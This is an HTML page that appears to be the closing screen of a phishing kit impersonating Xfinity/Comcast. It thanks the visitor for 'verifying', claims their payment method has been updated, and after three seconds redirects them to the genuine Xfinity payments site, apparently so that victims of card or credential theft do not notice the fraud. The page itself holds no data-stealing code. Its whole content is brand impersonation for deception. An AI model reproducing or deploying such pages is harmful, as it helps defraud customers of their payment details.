
<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="ie=edge" http-equiv="x-ua-compatible">
	<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
	<title>XFINITY | Thank you!</title>
	<link href="./CSS/S.ico" rel="icon">
	<meta content="noindex" name="robots">
	
	<link href="./CSS/CC2.css" rel="stylesheet" type="text/css">
	<link href="./CSS/CC.css" rel="stylesheet">
	<meta content="#ffffff" name="msapplication-TileColor">
	<meta content="#ffffff" name="theme-color">
	<meta content="KeisTVuqC7Jg8M_hmY6rtobs5NLYLtJ5MtNfmQYbyBI" name="google-site-verification">
	<meta content="app-id=776010987" name="apple-itunes-app">
</head>
<body>
	<main role="main">
		<div class="main-content">
			<header class="page-header page-app--takeover page-header--breadcrumbs ui-blue" id="page-header" role="banner">
				<div class="page-header__logo-wrap">
					<a class="page-header__logo icon-xfinity-white" href="#/" rel="home"><span class="visuallyhidden">Xfinity</span></a> <!-- <a href="#/" class="page-header__cancel-icon icon-remove-gray" rel="home"><span class="visuallyhidden">Cancel</span></a> -->
				</div><!-- ngIf: currentRoute.breadcrumbs.length !== 0 -->
				<!-- end ngIf: !agentView -->
			</header>
		</div><!-- end ngIf: access.loginRequired -->
		<br>
		<br>
		<br>
		<center>
			<img id="leftSide-image" src="./CSS/T.png">
			<h4 class="thank-you-takeover__first-name display2 bold">Thanks for Verifying!</h4><br>
			<br>
			<h3 class="thank-you-takeover__sub-heading heading1">Your payment method information has been updated</h3>
		</center>
		<meta content="3;url=https://payments.xfinity.com" http-equiv="refresh"><br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<br>
		<!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' -->
		<div class="xc-footer--bottom-container">
			<footer>
				<br>
				&nbsp; &nbsp; &nbsp; &nbsp;
				<style id="xc-footer-styles">
				xc-footer {
				display: block;
				background: #000;
				font-family: 
				</style><font color="#FFFFFF" face="Arial" size="1"><span class="content"><span class="content">&copy; 2020 Comcast</span><br></span><br></font>
			</footer>
		</div>
	</main>
</body>
</html>